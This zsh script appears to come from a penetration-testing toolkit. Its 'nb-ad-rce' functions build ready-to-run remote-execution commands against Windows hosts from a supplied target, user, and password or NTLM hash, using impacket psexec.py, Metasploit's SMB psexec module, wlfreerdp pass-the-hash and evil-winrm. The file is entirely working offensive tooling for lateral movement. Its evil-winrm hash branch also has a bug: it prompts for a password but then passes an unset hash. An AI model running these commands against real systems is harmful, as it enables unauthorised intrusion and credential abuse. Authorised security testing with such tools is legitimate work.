#!/usr/bin/env zsh

############################################################# 
# nb-ad-rce
#############################################################
nb-ad-rce-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-rce
----------
The nb-ad-rce namespace provides commands for getting shells/remote code execution on a target system.

Commands
--------
nb-ad-rce-freerdp              connect via freerdp to a target host
nb-ad-rce-evil-winrm           connect via winrm to a target host
nb-ad-rce-psexec               connect via psexec to a target host
nb-ad-rce-psexec-msf           connect via metasploit's psexec to a target host
DOC
}

nb-ad-rce-psexec() {
  nb-vars-set-rhost
  nb-vars-set-user
  echo

  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      __ask "Do you want to add a domain? (y/n)"
      local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

      if [[ $add_domain == "y" ]]; then
          __ask "Enter the domain"
          nb-vars-set-domain
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "psexec.py ${__DOMAIN}/${__USER}:'${__PASS}'@${__RHOST}"
      else
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "psexec.py ${__USER}:'${__PASS}'@${__RHOST}"
      fi
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "psexec.py ${__USER}@${__RHOST} -hashes :${__HASH}"
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-ad-rce-psexec-msf() {
  nb-vars-set-rhost
  nb-vars-set-user
  echo

  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      __ask "Do you want to add a domain? (y/n)"
      local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

      if [[ $add_domain == "y" ]]; then
          __ask "Enter the domain"
          nb-vars-set-domain
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbdomain ${__DOMAIN} ; set smbuser ${__USER} ; set smbpass ${__PASS} ; run\""
      else
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbuser ${__USER} ; set smbpass ${__PASS} ; run\""
      fi
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbuser ${__USER} ; set smbpass ${__HASH} ; run\""
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-ad-rce-freerdp() {
    nb-vars-set-rhost
    nb-vars-set-user
    echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    __ask "Do you wanna share a directory via RDP?"
    local dir && __askvar dir "SHARE_DIRECTORY"

    if [[ $login == "p" ]]; then
        echo
        __ask "Enter a password for authentication"
        nb-vars-set-pass
        if [[ $dir == "y" ]]; then
            local d && __askpath d DIRECTORY $HOME
            print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /p:'${__PASS}' /cert:ignore +drive:smbfolder,$d"
        else
            print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /p:'${__PASS}'"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        if [[ $dir == "y" ]]; then
            local d && __askpath d DIRECTORY $HOME
            print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /pth:'${__HASH}' /cert:ignore +drive:smbfolder,$d"
        else
            print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /pth:'${__HASH}'"
        fi
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-rce-evil-winrm() {
  nb-vars-set-rhost
  nb-vars-set-user

  echo
  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      echo
      __ask "Enter a password for authentication"
      nb-vars-set-pass
      print -z "evil-winrm -i ${__RHOST} -u '${__USER}' -p '${__PASS}'"
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      nb-vars-set-pass
      print -z "evil-winrm -i ${__RHOST} -u '${__USER}' -H '${__HASH}'"
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}
